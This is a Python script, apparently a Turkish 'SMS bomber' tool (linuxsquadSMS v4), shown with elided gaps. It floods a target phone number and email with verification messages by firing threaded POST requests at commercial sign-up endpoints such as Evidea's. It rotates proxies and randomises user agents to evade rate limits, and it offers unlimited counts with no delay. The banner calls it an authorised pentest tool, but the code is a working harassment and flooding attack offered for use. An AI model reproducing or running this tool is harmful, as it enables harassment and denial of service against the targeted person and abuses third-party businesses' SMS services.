...
adet=0;basarisiz=0;PROXIES=[];proxy_idx=0

def proxy_yukle():
    global PROXIES
    try:
        yol=input(f'{W}Proxy dosyasi (enter=proxies.txt yada bos=proxysiz): {G}').strip()
        if not yol:
            if os.path.isfile('proxies.txt'):
                with open('proxies.txt') as f: PROXIES=[l.strip() for l in f if l.strip() and not l.startswith('#')]
            return
        if os.path.isfile(yol):
            with open(yol) as f: PROXIES=[l.strip() for l in f if l.strip() and not l.startswith('#')]
        else:
            PROXIES=[p.strip() for p in yol.split(',') if p.strip()]
        if PROXIES: print(f'{G}[+] {len(PROXIES)} proxy yuklendi{S}')
    except: pass

def proxy_al():
    global proxy_idx
    if not PROXIES: return {}
    p=PROXIES[proxy_idx%len(PROXIES)];proxy_idx=(proxy_idx+1)%len(PROXIES)
...
class SMS:
    def __init__(s,phone,mail=None):
        ...
        ua=choice(["Mozilla/5.0 (Linux; Android 14; Pixel 8)","Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X)","Dalvik/2.1.0 (Linux; U; Android 13; SM-S908B)","Mozilla/5.0 (Linux; Android 13; Xiaomi 13)","Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X)"])
        s.headers={"User-Agent":ua,"Content-Type":"application/json","Accept":"application/json","Accept-Language":"tr-TR,tr;q=0.9","Connection":"keep-alive"}
    
    def gonder(s,ad,url,j,extra_h,bk):
        global adet,basarisiz
        try:
            h={**s.headers,**extra_h}
            r=requests.post(url,json=j,headers=h,proxies=proxy_al(),timeout=5)
...
def svc(s):
    ...
    try:
        ...
        r=requests.post('https://www.evidea.com/users/register/',headers=hdrs,data=d,proxies=proxy_al(),timeout=5)
        if r.status_code==202: global adet;adet+=1;print(f'{G}[+]{S}Evidea',flush=True)
    except: pass

def saldir(tel,mail,sayi,aralik,threads):
    global adet,basarisiz
    s=SMS(tel,mail);bas=time.time()
...
/_/_/_/ /_/\\__,_/_/|_/____/\\__, /\\__,_/\\__,_/\\__,_/   
                             /_/ v4 - Proxy + Agresif
"""+S)
    print(f'{G}[i]{S} linuxsquadSMS - Yetkilendirilmis Pentest Araci\n')
    proxy_yukle()
    try:
        ...
        aralik=input(f'{W}Aralik saniye (0=maximum): {G}').strip()
        aralik=float(aralik)if aralik else 0
        threads=input(f'{W}Thread sayisi (enter=15, max=100): {G}').strip()
        threads=int(threads)if threads else 15
        if threads>100: threads=100
        if PROXIES: print(f'{B}[!] {len(PROXIES)} proxy ile rotate mod aktif{S}')
        print(f'\n{B}[!] Hedef: {tel} | Adet: {sayi or "SINIRSIZ"} | Thread: {threads} | Basliyor...{S}\n')
        sure=saldir(tel,mail,sayi,aralik,threads);hiz=adet/sure if sure>0 else 0
        print(f'\n{G}{"="*50}')
        print(f'[+] Tamamlandi!')
        print(f'[+] Basarili: {adet} SMS')
        print(f'[+] Basarisiz: {basarisiz}')
        print(f'[+] Sure: {sure:.1f}s | Hiz: {hiz:.1f} SMS/sn')
        print(f'[+] Proxy: {len(PROXIES)} adet rotate edildi')
        print(f'{"="*50}{S}')
